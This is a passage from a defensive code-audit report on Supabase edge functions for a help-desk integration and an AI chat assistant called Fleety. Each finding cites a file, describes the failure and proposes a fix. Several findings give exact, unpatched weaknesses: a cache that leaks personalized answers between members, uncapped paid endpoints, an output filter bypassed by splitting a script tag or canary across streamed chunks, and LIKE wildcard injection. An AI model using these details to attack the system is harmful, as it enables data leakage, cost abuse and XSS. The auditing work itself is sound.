- **Where:** supabase/functions/freescout-provision-admin/index.ts:83-93
- **What breaks:** Added in verification. The insert into notifications uses columns title/body/link/category (84-89). The event processor's own comment (process-freescout-events/index.ts:109-115) documents that these exact columns DO NOT EXIST — the real columns are body_html/link_url/notification_type — and that a prior insert with body/link/category 400'd and was swallowed (HELP-DESK-028). This provision-admin insert repeats the same wrong columns and wraps them in an empty catch (line 91-92, '/* best effort */'), so PostgREST 400s and the admin's 'Your help desk account is ready' notification is silently dropped every time — the same dead-notification class the codebase claims to have fixed.
- **Smallest fix:** Route this through safe_create_notification (correct columns + outbox/retry) like the events processor does, and stop swallowing the insert error.
- _added-in-verification_

### [Low] userTagIndex leaks dead keys — LRU eviction and pre-emptive tagging never prune the tag index  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/_shared/freescoutCache.ts:12-20,56-62; supabase/functions/freescout-proxy/index.ts:269
- **What breaks:** Verified: touch() evicts entries from store when it exceeds 500 (lines 15-19) but never removes the corresponding key from userTagIndex, and tagForUser is called pre-emptively on every cache MISS (proxy:269) even when setCached is never reached because freescoutFetch throws first. Over a long-lived warm isolate userTagIndex accumulates a growing Set of dead key strings per user. Growth is bounded in practice because every mutation calls invalidateAll() which clears userTagIndex, so the leak only accrues on read-heavy isolates between mutations — real but slow.
- **Smallest fix:** Prune userTagIndex on eviction (store a key->user backref) and only tag after a successful setCached.

### [Low] Notification RPC failure is logged-and-forgotten — member silently never notified, event still deleted  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/process-freescout-events/index.ts:120-139,239
- **What breaks:** Verified: if safe_create_notification returns an error, the code only console.error's at level 'warn' (128-138) and processOne returns normally, so freescout_delete_event (line 239) consumes the message. The comment trusts safe_create_notification's own outbox/retry, but a transport-level failure of the RPC call itself is neither retried nor DLQ'd for this branch — the member never gets the in-app 'new reply / status updated' notification and the triggering event is gone.
- **Smallest fix:** Treat a notification RPC transport error as a processOne failure (throw) so pgmq re-delivers, or record it for retry rather than dropping.

### [Low] ownsConversation swallows upstream errors as false — Freescout outage surfaces to the real owner as 403 Forbidden  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/freescout-proxy/index.ts:177-192,363-364,428-429,454-455
- **What breaks:** Verified: when there is no local pointer, ownership is confirmed by fetching the conversation from Freescout, and any exception is caught and returns false (189-191). Fail-closed is safe, but the member who legitimately owns the ticket is told 'Forbidden' (403 at get/reply/close) whenever Freescout is briefly down or slow, instead of a retryable 5xx. Support looks permission-denied to the true owner during any upstream blip and the real cause is hidden.
- **Smallest fix:** Distinguish 'not owner' from 'could not verify': on upstream error throw a 503-style retryable error rather than returning false.

### [Low] provision paths INSERT a fresh log row every attempt instead of updating — unbounded log + ambiguous attempt count  `ownership` (CONFIRMED)
- **Where:** supabase/functions/freescout-provision-customer/index.ts:74-80,84-90; supabase/functions/support-provisioning-retry/index.ts:43-49,64-70,87-93,100-106
- **What breaks:** Verified: every provision/retry branch INSERTs a new support_provisioning_log row (always attempts:1 in provision-customer:79; row.attempts+1 in retry) rather than updating the existing retry row. The attempts count is split across many rows, so support_pending_provisioning must reconstruct the latest status, and a first-failure row (attempts:1) and a later success row (attempts:1) share the same value with ambiguous ordering — 'pending' can re-select an already-provisioned user and re-run createCustomer. The table also grows one row per attempt forever.
- **Smallest fix:** Upsert a single row per (user_id,kind) and increment attempts in place; make the pending select deterministic (latest by created_at).

### [Low] support-provisioning-retry has no row claim/visibility-timeout — overlapping cron runs double-provision Freescout users/customers  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/support-provisioning-retry/index.ts:24-33,54-94,110
- **What breaks:** Verified: support_pending_provisioning is a plain SELECT with no claim/visibility-timeout (24-26), and the loop sleeps 1s per row (line 110), so 25 rows take 25s+ of Freescout latency. If a run exceeds the cron interval, a second invocation SELECTs the same still-'retry' rows and both process them concurrently: two findUserByEmail/findCustomerByEmail both miss → two createUser/createCustomer → duplicate Freescout records for one member (the findByEmail dedup has a TOCTOU window).
- **Smallest fix:** Claim rows atomically (status->'in_progress' with a timeout, or a FOR UPDATE SKIP LOCKED RPC) before processing so overlapping runs don't double-provision.

### [Low] safeEventId synthesizes coarse ids that collide — distinct events dropped as duplicates  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/freescout-webhook/index.ts:11-19,54,60-65
- **What breaks:** Verified: when a payload lacks event_id/id, the id is synthesized as `type:conv:thread:ts` (line 18). If timestamp is absent (empty) and thread id is absent, two genuinely distinct events of the same type on the same conversation collapse to an identical synthetic id, so the dedupe insert (line 60) 23505s the second and it is never enqueued — e.g. two rapid status changes or two thread-less replies silently merge into one processed event.
- **Smallest fix:** Fall back to a content hash of the full payload (or reject events with no stable id) rather than a tuple that omits distinguishing fields.

### [Low] provision-admin logs status:'success' though the profiles update result is never checked  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/freescout-provision-admin/index.ts:72-94
- **What breaks:** Verified: after createUser, the profiles update (line 72) discards its error, then a support_provisioning_log row with status:'success' is inserted (75-81) and the caller is told ok. If the profile write failed (RLS, transient DB error), freescout_user_id is NOT persisted but the audit trail says success and the admin is told provisioning succeeded; any consumer trusting freescout_user_id then reads null while the log claims done.
- **Smallest fix:** Check the update error and log status:'retry' (and fail) if the id was not persisted; only log success after the profile write is confirmed.

### [Low] Event processor and multiple lookups use .maybeSingle() on profiles.email — a shared/duplicate email throws and DLQs the event  `error-handling` (PLAUSIBLE)
- **Where:** supabase/functions/process-freescout-events/index.ts:52-57
- **What breaks:** Added in verification. processOne resolves the owner with .eq('email', customerEmail).maybeSingle() (52-57). maybeSingle() throws when more than one row matches. If profiles.email is not uniquely constrained (two members with the same email, or a stale duplicate after an email change), the lookup throws, processOne fails, and after MAX_ATTEMPTS the event is sent to the DLQ (index.ts:253-259) — every support event for those members stops updating pointers/notifications. Marked PLAUSIBLE because it depends on whether profiles.email has a unique constraint, which isn't enforced in this code path.
- **Smallest fix:** Use a deterministic select (order + limit(1)) or confirm/enforce a unique constraint on profiles.email, and handle the multi-row case explicitly instead of letting maybeSingle throw into the DLQ path.
- _added-in-verification_

---

## Edge: Fleety AI (part 1/2 — chat, embeddings & review)

### [High] Response cache leaks one member's personalized answer to every other member  `ownership` (CONFIRMED)
- **Where:** supabase/functions/techfleet-chat/index.ts:835 (exactHash = sha256(`${audience}|${message}`)), :1685-1762 (USER CONTEXT built from profiles/project_roster/user_quest_selections), :1817-1831 (userContext injected into buildSystemPrompt), :2003-2011 (isCacheable), :2116-2139 (fleety_cache_store, embedding-keyed for L3 semantic)
- **What breaks:** Verified: the L2 key is sha256(audience|message.toLowerCase()) and the L3 semantic key is queryEmbedding+audience — neither includes user_id. Every generated turn injects USER CONTEXT (asker's first name, active project + CLIENT name, member role, phase, end date, active quest) into the system prompt with only a soft 'do not echo this block back' instruction. isCacheable (line 2003) checks hasGrounding/haveEmbeddings/!canned/no-web/len<=800 but does NOT exclude turns that carried userContext, so a grounded answer tailored to (or naming) member A's Acme project is written to the permanent cache and later replayed verbatim (L2 exact) or via cosine match (L3 semantic) to members B/C/D asking the same/similar question for the same audience. Cross-member disclosure of names, client names, project assignments — and answers 'tailored' to the wrong person. Cache never time-expires, so one poisoned entry serves for the life of the kb_version.
- **Smallest fix:** Exclude any turn where userContext !== '' from isCacheable, or forbid USER CONTEXT injection on cacheable turns and add a store-time guard that refuses to persist an answer containing profile/roster values. Do not key personalized answers by audience+question alone.

### [High] Material-review chat answers are cached and served cross-member (isCacheable never excludes hasMaterial)  `ownership` (CONFIRMED)
- **Where:** supabase/functions/techfleet-chat/index.ts:781 (hasMaterial), :856 (exact-cache HIT skipped when hasMaterial), :2003-2011 (isCacheable — no hasMaterial / chatMode guard), :2116-2139 (fleety_cache_store)
- **What breaks:** The exact-cache LOOKUP is correctly skipped for material turns (line 856: `!hasMaterial`), but the STORE is not. isCacheable includes materialContext via hasGrounding (line 1790) and never checks hasMaterial or chatMode. So when member A pastes/links their own Figma or uploads a deliverable and asks e.g. 'review my figma https://…' (short, <=800 chars, no web sources), Fleety's answer — which is entirely about A's private deliverable content — is written to the permanent cache keyed by audience+question. Member B who later types the same short question with NO material gets member A's deliverable critique replayed verbatim (exact hit) or via L3 semantic cosine match. Same class of cross-member disclosure as the userContext leak, but the payload is another member's actual work product. mode:'review'/'plan' generations are stored under a plain chat hash too, since isCacheable ignores chatMode.
- **Smallest fix:** Add `&& !hasMaterial && chatMode === 'chat'` to isCacheable so content-specific and non-chat turns are never persisted to the shared cache.
- _added-in-verification_

### [High] fill-content-gaps re-embed call to fleety-embed uses a body shape fleety-embed rejects — embeddings never refresh  `dependency` (CONFIRMED)
- **Where:** supabase/functions/fill-content-gaps/index.ts:210-227 (updatedSlugs push `${entity}:${slug}`; invoke body {reason, slugs}) vs supabase/functions/fleety-embed/index.ts:131 (Mode A needs body.text), :139 (Mode B needs mode:'backfill'), :332-346 (Mode C needs body.slugs AND typeof body.table==='string' matching /^reference_[a-z_]+$/), :375-381 (400 fallthrough)
- **What breaks:** Verified end-to-end. After writing AI descriptions into reference_* tables, fill-content-gaps invokes fleety-embed with { reason:'content-gap-fill', slugs } and NO `table`, and slugs formatted as `entity:slug` (e.g. 'workshop:facilitation'), not raw slugs. That body matches no mode: no `text` (not A), no `mode:'backfill'` (not B), no `table` (fails C's guard at :332), so it hits the 400 'Provide { text }, { mode: backfill }, or { slugs, table }' branch and embeds nothing. Even if a table were supplied, `entity:slug` would never match reference_* raw slugs at :347. The invoke result is only console.warn'd on throw (:224), and a 400 response is not a throw, so it is swallowed silently. Net: descriptions change in the DB but Fleety's knowledge_base embeddings for those entities are never regenerated — the exact gap the job advertises stays open forever.
- **Smallest fix:** Per reference table, invoke fleety-embed with { mode:'backfill', table:'reference_xxx' } or { table:'reference_xxx', slugs:[rawSlug,…] } (raw slugs), and check the invoke response body/status, not only catch throws.

### [High] fleety-review is an uncapped DeepSeek-V4-Pro + outbound-fetch endpoint (no rate limit, no quota, no cost accounting)  `security` (CONFIRMED)
- **Where:** supabase/functions/fleety-review/index.ts:88-160 (member JWT only, then fetchMaterialText + full v4-pro completion, max_tokens 1400, capMaterial ~40k chars) vs techfleet-chat/index.ts:644-747 (per-user quota + system rate limit + cost guard + fleety_record_cost)
- **What breaks:** Verified: fleety-review authenticates a member JWT (:94-102) and then, on every request, does a bounded outbound material fetch (:125) and a DeepSeek V4 Pro completion (:138-154) with NO enforceEdgeRateLimit, NO check_fleety_user_quota, NO check_chat_system_rate_limit, NO fleety_cost_guard_step, and NO fleety_record_cost anywhere in the file. Any member can loop this to run unbounded V4-Pro inference and drive the outbound fetcher, and because it never records cost, the whole Fleety cost-guard/budget system that techfleet-chat relies on to throttle is blind to it — the guard reads 'none' while this endpoint burns the budget. Cost blowout plus a DoS/abuse vector that bypasses every control the sibling chat path added.
- **Smallest fix:** Add enforceEdgeRateLimit, consult fleety_cost_guard_step (bail on 'hard'), and call fleety_record_cost after the completion so review turns count against the same budget/guard as chat.

### [Medium] Output sanitization runs per SSE delta — a script/PII/canary token split across chunks evades it  `boundary` (CONFIRMED)
- **Where:** supabase/functions/techfleet-chat/index.ts:2042-2044 (sanitizeAIOutput(content) applied to each delta independently; pendingTail is joined AFTER sanitize and only for the follow-up sentinel), sanitizeAIOutput at :173-206
- **What breaks:** Verified: the transform decodes each SSE chunk, calls sanitizeAIOutput(content) on that delta ALONE (line 2043), and only then joins pendingTail (line 2050) — and pendingTail exists solely to detect the follow-up sentinel, never to re-sanitize. sanitizeAIOutput's regexes (script/iframe/js:/on*=, email/SSN/CC PII, canary redaction) match only within a single delta. Model output streams in small deltas, so '<scr'|'ipt>…</script>', 'foo@ba'|'r.com', or the canary split across a boundary passes unredacted because each half matches nothing. The code's own comment (:200-202) admits per-chunk streaming can split even the brand token. If the Fleety widget renders any HTML this is a streamed XSS; regardless it is a PII/canary-leak bypass of the DLP the code claims as defense-in-depth.
- **Smallest fix:** Carry a pendingTail across chunks for the sanitizer too (hold back the last N chars, sanitize on the joined buffer), or accumulate to a token/line boundary before sanitizing and emitting.

### [Medium] Learning-digest auto-promotes canned answers by timestamp-matching a chat_messages row this pipeline never writes  `ownership` (CONFIRMED)
- **Where:** supabase/functions/fleety-learning-digest/index.ts:261-292 (reads chat_messages by conversation_id + role='assistant' + created_at >= turn.created_at, limit 1, inserts fleety_canned_answers); techfleet-chat/index.ts writes fleety_turn_signals only (grep confirms zero chat_messages inserts)
- **What breaks:** Verified: grep of techfleet-chat found NO chat_messages write — the handler persists fleety_turn_signals (:1857) but never the assistant reply. The auto-promoter (:262-270) pairs a turn to 'the first assistant message at/after the turn-signal insert time' in chat_messages, a table populated by some other (frontend) path. If two turns land close together, the client stored an edited/different reply, or stored nothing, the promoter silently pairs the wrong answer with a question_pattern (or promotes nothing). A mispaired draft fleety_canned_answers row, once an admin enables it, is served near-verbatim to all matching members (canned answers short-circuit the LLM). Wrong-answer-to-question at scale, born from a cross-module created_at>= heuristic across a table this service does not own.
- **Smallest fix:** Persist the assistant reply keyed by turn_id at generation time (in techfleet-chat) and join on turn_id, not a created_at>= heuristic across chat_messages.

### [Medium] Member query text shipped to Lovable/Gemini gateway with no US-residency pin or DLP scrub, contradicting the chat path's residency guarantee  `dependency` (CONFIRMED)
- **Where:** supabase/functions/fleety-learning-digest/index.ts:366-378 (raw c.sample member query -> https://ai.gateway.lovable.dev, google/gemini-2.5-flash-lite, no provider pin, no dlpScrub) vs techfleet-chat/index.ts:96-100 US_INFERENCE_PROVIDERS pin + dlpScrub. (fill-content-gaps:71-109 also uses the unpinned gateway but sends reference entity NAMES, not member PII — residency drift only.)
- **What breaks:** Verified: techfleet-chat pins DeepSeek to US inference providers and DLP-scrubs output because 'user chat can contain personal data'. The learning-digest playbook-draft path embeds the raw member query (c.sample, free-form member-authored, may contain names/PII) verbatim into the prompt (:366) and sends it to the Lovable AI gateway with no residency pin and no DLP scrub. Same personal-data class, weaker privacy posture — the advertised residency guarantee silently does not hold for this batch path. Compliance/residency drift plus PII egress.
- **Smallest fix:** Route the gateway call through the same residency-pinned provider set and DLP-scrub c.sample before sending, or cluster on the normalized key only and drop the raw sample from the prompt.

### [Medium] fleety_topic_insights snapshot rebuild is a non-transactional delete-then-insert with a concurrency race  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/fleety-learning-digest/index.ts:183-197 (delete .neq(id, zero-uuid) then, only if rows.length>0, insert) and :88-123 (both service-role AND admin-JWT auth paths exist)
- **What breaks:** Verified: the digest wipes all of fleety_topic_insights (:183-186) then inserts the new snapshot (:197) as two separate statements with no transaction. Between them the /admin/fleety-coach page reads an empty insights set. If the insert throws, or rows.length===0 for a quiet week, the table is left empty with no rollback. Both cron (service-role) and manual admin invocation are allowed (:98-123), so two concurrent runs interleave delete/insert and produce duplicated or lost rows. The admin coaching dashboard shows blank or doubled gap data exactly while it is being refreshed.
- **Smallest fix:** Do the replace in a single DB transaction/RPC (truncate+insert atomically) and guard concurrent runs with an advisory lock or a 'skip if already running' check.

### [Medium] Playbook/example embeddings are never re-embedded on a model change and carry no model tag — silent vector-space drift  `ownership` (CONFIRMED)
- **Where:** supabase/functions/fleety-embed/index.ts:194-217 (playbooks: filter `!x.embedding`, update embedding but NOT embedding_model), :219-242 (examples: same) vs :172,:179 (KB path re-embeds when embedding_model != GEMINI_EMBED_MODEL_TAG and writes the tag)
- **What breaks:** Verified: the KB backfill re-embeds any row whose embedding_model != current tag (:172) and stamps embedding_model (:179), so a model change self-heals. Playbooks (:200) and examples (:225) only embed rows where `!x.embedding` (NULL only) and never write embedding_model at all (:206-209, :231-234). When the embedding model/dimension changes (it already changed once per the KB comment), every existing playbook/example keeps a stale vector in the OLD space and is never refreshed. New-space query embeddings are then cosine-compared against old-space vectors, so fleety_match_playbooks_semantic / fleety_match_examples_semantic return garbage similarities — practical answers silently lose their playbook/example spine with no error.
- **Smallest fix:** Give playbooks/examples the same embedding_model tag + re-embed-on-tag-mismatch logic the KB path uses (write GEMINI_EMBED_MODEL_TAG, filter on tag mismatch, not just NULL).

### [Medium] fleety-review reloads ALL workshop_step rows with no pagination or workshop filter — reintroduces the 1000-row PostgREST truncation the embed path fixed  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/fleety-review/index.ts:59-66 (loadExpectations for a workshop: select workshop_step .eq(is_active,true) with no .range/.limit and no workshop filter, then groupSteps over all) vs fleety-embed/index.ts:253-267 which paginates spf_entity workshop_step by 1000 'because a single query silently dropped the tail once the SPF grew past 1000 (audit #3)'
- **What breaks:** Verified: for a workshop review, loadExpectations fetches every active workshop_step row in one query (:60-64) with no pagination and no filter to the target workshop. PostgREST caps a single response at 1000 rows; once SPF workshop_steps exceed 1000, the tail is silently dropped, so the expectations rubric handed to the reviewer is incomplete — Fleety reviews a member's deliverable against a truncated rubric and reports steps as missing that are only missing from the query. This is the identical bug the embed path already hit and paginated around; the review path copied the pre-fix pattern and also scans the whole step table for a single review.
- **Smallest fix:** Paginate workshop_step by id/range like the spf-kb backfill, and/or filter to steps belonging to the target workshop; do not load the whole table for one review.

### [Low] Body-size limit is enforced only from the client Content-Length header and is trivially bypassed  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/techfleet-chat/index.ts:524-534 (parseInt(content-length) gate) then :536 await req.json() with no byte cap; schema allows MAX_MESSAGES 50 × MAX_MESSAGE_LENGTH 20000 (:58,:60)
- **What breaks:** Verified: MAX_BODY_BYTES (256KB, :56) is checked only against the Content-Length header (:524). A client that omits Content-Length (chunked transfer) or lies about it skips the gate entirely, and req.json() (:536) then buffers the whole body into isolate memory before validation. The schema permits 50 × 20k ≈ 1MB of content past the '256KB' bound. Memory-pressure/DoS vector on the busiest Fleety endpoint.
- **Smallest fix:** Read the body as bytes with a hard cap (reject once the stream exceeds MAX_BODY_BYTES) instead of trusting the header.

### [Low] Weekly-digest compares the service-role key with a non-constant-time string !==, unlike every sibling cron  `security` (CONFIRMED)
- **Where:** supabase/functions/fleety-weekly-digest/index.ts:23 (`auth !== \`Bearer ${SERVICE_ROLE}\``) vs fleety-embed/fleety-learning-digest which call authorizeServiceRoleRequest (documented constant-time exact match, audit C1/C2)
- **What breaks:** Verified: every other cron function in this section uses the shared constant-time authorizeServiceRoleRequest and comments on why; fleety-weekly-digest hand-rolls a plain `!==` comparison of the full service-role key (:23), a timing side channel on the most privileged secret in the system. Lower practical risk over HTTPS/edge, but it is an inconsistent, self-inflicted regression of an explicitly-hardened control.
- **Smallest fix:** Replace the manual compare with authorizeServiceRoleRequest(req).ok like the other cron functions.

### [Low] Weekly and learning digests silently truncate their aggregates at 1000/2000 rows  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/fleety-weekly-digest/index.ts:37-41 (.limit(1000), totals computed in JS) and supabase/functions/fleety-learning-digest/index.ts:128-132 (.limit(2000), clusters/thumbs/gaps computed in JS)
- **What breaks:** Verified: both digests pull raw signal rows with a fixed limit and compute totals/thumbs/gaps in JS over whatever came back. Once weekly Fleety volume exceeds these caps (plausible at 767 active users), the counts, thumbs balance, and gap ranking are computed on a silently truncated slice, so the admin metrics understate real usage and can rank the wrong gaps — with no indication the data was cut off.
- **Smallest fix:** Aggregate in SQL (COUNT/SUM/GROUP BY via an RPC or view) instead of fetching capped raw rows into the function.

### [Low] ilike dedup checks pass user-controlled text as the LIKE pattern (wildcard injection)  `security` (CONFIRMED)
- **Where:** supabase/functions/fleety-learning-digest/index.ts:210-211 (.ilike('from_entity', rel.from)/.ilike('to_entity', rel.to) — rel from detectRelationshipQuestion over member query) and :258 (.ilike('question_pattern', pattern) — pattern = user_query.trim().slice(0,500)). [Original ':302-311 canned decay' citation corrected: that path uses fbMap, not ilike.]
- **What breaks:** Verified: rel.from/rel.to (:80,:84) and pattern (:253) derive directly from member query text and are used as ilike patterns. A query containing % or _ turns the dedup lookup into an over-broad match (a lone '%' matches every row), so the 'skip if a similar one already exists' guard either wrongly skips legitimate new proposals or, with an under-matching literal, inserts duplicates. Junks the admin review queues (fleety_proposed_relationships / fleety_canned_answers) with duplicate or missing entries.
- **Smallest fix:** Escape %,_,\\ before using as an ilike pattern, or compare with eq on a normalized key rather than ilike on raw user text.

### [Low] fill-content-gaps only queries null/empty descriptions but claims to fill 'under 20 chars'  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/fill-content-gaps/index.ts:175-179 (.or('description.is.null,description.eq.')) then :185-186 JS filter for trim().length < 20
- **What breaks:** Verified: the DB query matches only null or exactly-empty descriptions (:178); the subsequent JS filter for length<20 (:186) can therefore never see a 1–19 char row — it was never fetched. Rows with short-but-nonblank descriptions ('n/a', 'TBD', 'skill') are silently never filled even though the file header (:3) and the JS filter both promise 'missing or under 20 chars'. The gap the job advertises to admins is only partially closed.
- **Smallest fix:** Broaden the DB predicate to also match short descriptions (char_length(description) < 20) rather than relying on a JS filter over a null/empty-only fetch.

### [Low] register-fleety-command leaks raw Discord API bodies and internal config detail to the client  `security` (CONFIRMED)
- **Where:** supabase/functions/register-fleety-command/index.ts:102-108 (returns raw Discord API `data` object) and :116-123 (returns err.message, e.g. 'Missing DISCORD_BOT_TOKEN or DISCORD_APPLICATION_ID' from :67)
- **What breaks:** Verified: unlike techfleet-chat which returns generic errors (OWASP A09), register-fleety-command echoes the raw Discord API error object (:104) and raw exception messages including config-presence signals like which env var is missing (:67 -> :119) back in the HTTP response. Admin-only, so blast radius is limited, but it discloses infrastructure/config state and is inconsistent with the platform's stated error-hiding discipline.
- **Smallest fix:** Log the detail server-side; return a generic message + status to the client as the chat handler does.

### [Low] fleety-embed Mode A (query embedding) is callable by any authenticated member with no quota, rate limit, or cost accounting  `security` (PLAUSIBLE)
- **Where:** supabase/functions/fleety-embed/index.ts:104 (needsAuth = !(isService || (isCron && isBackfill))), :106-128 (any valid JWT passes; isAdmin computed but not required for Mode A), :131-136 (Mode A: `typeof body.text === 'string'` -> embedText for ANY authenticated user)
- **What breaks:** Verified: Mode A returns an embedding for any request carrying a valid member JWT — the admin/service gate only applies to backfill (Mode B, :140) and single-slug (Mode C, :333). Mode A runs embedText (a paid Gemini gemini-embedding-001 call) with no enforceEdgeRateLimit, no per-user quota, and no fleety_record_cost. Any of the 767 members can loop { text } to drive unbounded, unmetered embedding spend that the Fleety cost guard cannot see (same blind-spot class as fleety-review, smaller unit cost).
- **Smallest fix:** Rate-limit and cost-account Mode A per user (or restrict it to service/admin callers if the frontend does not actually need a public embedding endpoint).
- _added-in-verification_

---

## Edge: Fleety AI (part 2/2 — knowledge ingestion & content)

### [High] CSV & workshop ingest never invalidate embeddings -> permanent stale-vector drift in Fleety RAG  `ownership` (CONFIRMED)
- **Where:** supabase/functions/ingest-csv-knowledge/index.ts:179-187; supabase/functions/ingest-workshop-docs/index.ts:220-228 (vs guide-ingest/index.ts:6-7,141-151)
- **What breaks:** Verified: both upserts write only url/title/content/scraped_at with onConflict:url and NO embedding/embedding_model field. guide-ingest's header and lines 141-151 state the contract — a changed row MUST null embedding so fleety-embed (embedding IS NULL only) re-vectorises. On any re-ingest of changed content the OLD embedding survives, fleety-embed skips the row, and Fleety's semantic search matches the stale vector while text is updated (or never surfaces the corrected content). Silent: no error, no metric. Content team believes edits are live while RAG serves pre-edit meaning.
- **Smallest fix:** Add embedding:null and embedding_model:null to both upsert payloads exactly as guide-ingest does; gate on a content_hash change so unchanged rows aren't needlessly re-embedded.

### [High] seed-content non-atomically blanks the legal/consent surface on partial failure  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/seed-content/index.ts:38-40,43-68
- **What breaks:** Verified: line 40 UPDATEs is_current=false for all six policy keys and its result is never checked; only THEN does the loop (43-68) read bundled .md files and upsert. No transaction, no rollback. If Deno.readTextFile throws (renamed bundle, moved deploy path, permissions) or an upsert errors, the retire has already committed and there is NO current row for those policies — consent/legal pages querying is_current=true go blank platform-wide. Because the retire error is unchecked and onConflict is (policy_key,version,language), a failed retire that leaves 2.0.0 current plus a fresh 1.0.0 is_current=true upsert yields TWO current rows, breaking any .single() 'current policy' query.
- **Smallest fix:** Do retire+reseed in one Postgres RPC transaction, or read+validate every file first and retire only after all upserts succeed; and check the retire update's error before proceeding.

### [High] seed-content silently rolls published policies back to hardcoded 1.0.0  `ownership` (CONFIRMED)
- **Where:** supabase/functions/seed-content/index.ts:1,38-40,50-62
- **What breaks:** Verified: version is pinned to the literal '1.0.0' (line 52), onConflict is (policy_key,version,language), and line 40 retires is_current on whatever is current. If a real publisher path later made 2.0.0 current, re-running seed-content retires 2.0.0 and re-marks bundled 1.0.0 current — a silent legal rollback to older Terms/Privacy. policy_versions.is_current has two uncoordinated writers (this bootstrap + the publisher). The file is tagged // @edge-cron (line 1), so a scheduled re-run repeats the rollback every cycle. And because version never changes while body_md/checksum do, one version number maps to different legal text over time, destroying the record of what each user actually consented to (compliance defect).
- **Smallest fix:** Make seed-content a true one-shot that no-ops if any current policy already exists; derive/increment version from content and refuse to overwrite a non-seed version; never blanket-retire versions it does not own.

### [High] prewarm-ugc-worker has no atomic dequeue — overlapping crons double-spend paid AI  `boundary` (CONFIRMED)
- **Where:** supabase/functions/prewarm-ugc-worker/index.ts:107-123
- **What breaks:** Verified: cron every 30s. Worker SELECTs status='pending' limit 50 (108-114) then a SEPARATE UPDATE sets status='processing' .in('id',ids) (122-123) with NO WHERE status='pending' guard and NO FOR UPDATE SKIP LOCKED. 50 serial Lovable calls easily exceed 30s, so the next cron selects the SAME pending rows and re-translates them. The ugc_translations upsert dedups the stored result, but the paid gemini calls are duplicated and DAILY_CAP is blown by the overlap. Direct cost overrun and wasted quota under normal scheduling.
- **Smallest fix:** Claim atomically: UPDATE ... SET status='processing' WHERE status='pending' ... RETURNING, or SELECT ... FOR UPDATE SKIP LOCKED inside an RPC, so only one worker owns each job.

### [High] prewarm-ugc-worker: failed jobs never retried and orphaned 'processing' jobs never reaped  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/prewarm-ugc-worker/index.ts:121-123,162-187
- **What breaks:** Verified: any transient error (ai_500, network, empty response) sets terminal status='failed' with attempts++ (162-187); nothing ever re-queues 'failed'→'pending', so a momentary Lovable hiccup permanently kills that translation. attempts is written and never read for retry. Separately, jobs are set 'processing' up front (123) and only flipped to 'done' in the final batched update (174); translate() has no timeout and the loop is 50 serial calls, so if the function times out mid-loop every not-yet-finished job is stranded in 'processing' with no reaper to reset stale rows. UGC translations silently stall forever and the queue fills with dead 'processing'/'failed' rows.
- **Smallest fix:** Bounded retry (requeue to 'pending' while attempts < N, else 'failed'), plus a reaper that resets 'processing' rows older than a timeout back to 'pending'.

### [High] firecrawl-search lets any of 767 members trigger unbounded paid external searches  `security` (CONFIRMED)
- **Where:** supabase/functions/firecrawl-search/index.ts:27-56,87-100
- **What breaks:** Verified: auth requires only a valid user JWT (getUser at 50) — no role check. Each call fans out to Firecrawl's paid /v1/search with scrapeOptions.markdown (89-100). There is no per-user rate limit, no daily quota, no cost guard (contrast prewarm's DAILY_CAP). One curious or malicious member scripting this endpoint runs up the Firecrawl bill without limit and can exhaust the shared API quota so web search dies for everyone. The 500-char query truncation labelled 'prevent abuse' does nothing to limit call volume.
- **Smallest fix:** Add per-user rate limiting / a shared daily call cap (as prewarm has) and gate to roles that actually need web search.

### [Medium] prewarm-ugc-worker cost cap silently disabled when the count RPC errors  `error-handling` (CONFIRMED)
- **Where:** supabase/functions/prewarm-ugc-worker/index.ts:98-105
- **What breaks:** Verified: line 99 destructures only { data } from rpc('ugc_translations_count_fast') — the error is discarded. Line 100 coerces non-number to 0, so if the RPC fails or returns null, usedToday=0 and the DAILY_CAP guard (101) never trips — the cost ceiling evaporates exactly when the DB is unhealthy. The comment admits the count is a planner ESTIMATE, so even on the happy path the cap can undercount and overshoot the real spend limit.
- **Smallest fix:** Check the RPC error and fail closed (skip the batch) when the count is unavailable; use an exact count for the cap or add a hard secondary per-invocation call ceiling.

### [Medium] scrape-figma-workshops mislabels scraped descriptions as source='csv', corrupting provenance and edit protection  `ownership` (CONFIRMED)
- **Where:** supabase/functions/scrape-figma-workshops/index.ts:282-289 (vs ingest-reference-csv/index.ts:390-408)
- **What breaks:** Verified: reference_workshops.description has two writers. This Figma scraper writes description_source='csv' (line 286) for content that came from a Figma web scrape. ingest-reference-csv's placeholder-merge only protects existingIsAdmin (line 395) and treats 'csv' as authoritative CSV provenance, so a later CSV re-ingest with a real value freely overwrites the scraped text (392-400) and vice-versa, while System Health → Content reports it as CSV-sourced. Provenance is a lie and the edit-protection logic cannot distinguish the two real sources.
- **Smallest fix:** Use a distinct description_source (e.g. 'figma_scrape') and teach the merge precedence, so provenance is truthful and edit protection is correct.

### [Medium] scrape-figma-workshops overwrites the wrong workshop on a 0.45 fuzzy match  `under-engineering` (CONFIRMED)
- **Where:** supabase/functions/scrape-figma-workshops/index.ts:29-36,262-289
- **What breaks:** Verified: matching is token-set Jaccard (similarity, 29-36) with threshold best.score >= 0.45 (267) and picks only the single best score with no runner-up gap check. Two workshops sharing a couple of generic tokens ('Design Sprint Workshop' vs 'Design Discovery Workshop') can cross 0.45, and the scraper UPDATEs the description of the wrong reference_workshops row (282-289), replacing a correct description with scraped text from an unrelated Figma file, then re-embeds it (295-297). The write is silent (results shows ok:true) so Fleety confidently serves the wrong workshop content. No human confirmation for non-dryRun writes.
- **Smallest fix:** Raise the threshold and require an unambiguous match (reject when top-2 scores are close); default auto-discovered URLs to dryRun.

### [Medium] Five ingest/content functions bypass the shared constant-time service-role check; seed-content uses substring .includes()  `security` (CONFIRMED)
- **Where:** seed-content/index.ts:31; write-exploration-cache/index.ts:34; ingest-reference-csv/index.ts:205; scrape-figma-workshops/index.ts:79; prewarm-ugc-worker/index.ts:79 (canonical helper: _shared/service-role-auth.ts:20-49)
